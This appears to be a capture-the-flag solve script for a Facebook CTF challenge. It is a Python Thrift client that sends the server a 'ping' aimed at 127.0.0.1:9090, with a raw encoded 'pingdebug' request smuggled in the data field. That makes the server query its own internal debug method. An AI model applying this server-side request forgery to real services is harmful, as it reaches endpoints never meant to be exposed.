import sys
import glob
sys.path.append('gen-py')
#sys.path.insert(0, glob.glob('../../lib/py/build/lib*')[0])

from ping import PingBot
from ping.ttypes import Proto, Ping, Pong, Debug, PongDebug

from thrift import Thrift
from thrift.transport import TSocket
from thrift.transport import TTransport
from thrift.protocol import TBinaryProtocol


def main():
    # Make socket
    transport = TSocket.TSocket('challenges.fbctf.com', 9090)

    # Buffering is critical. Raw sockets are very slow
    transport = TTransport.TBufferedTransport(transport)

    # Wrap in a protocol
    protocol = TBinaryProtocol.TBinaryProtocol(transport)

    # Create a client to use the protocol encoder
    client = PingBot.Client(protocol)

    # Connect!
    transport.open()
    p = Ping()
    p.proto = 1
    p.host = '127.0.0.1:9090'
    p.data = '\x80\x01\x00\x01\x00\x00\x00\x09\x70\x69\x6E\x67\x64\x65\x62\x75\x67\x00\x00\x00\x00\x0C\x00\x01\x08\x00\x01\x00\x00\x00\x01\x0B\x00\x02\x00\x00\x00\x0E\x31\x32\x37\x2E\x30\x2E\x30\x2E\x31\x3A\x39\x30\x39\x30\x0B\x00\x03\x00\x00\x00\x03\x68\x65\x79\x00\x00'


    res = client.ping(p)
    print(res)

    d = Debug()
    d.dummy = 1
    print(client.pingdebug(d))
    # Close!
    transport.close()

main()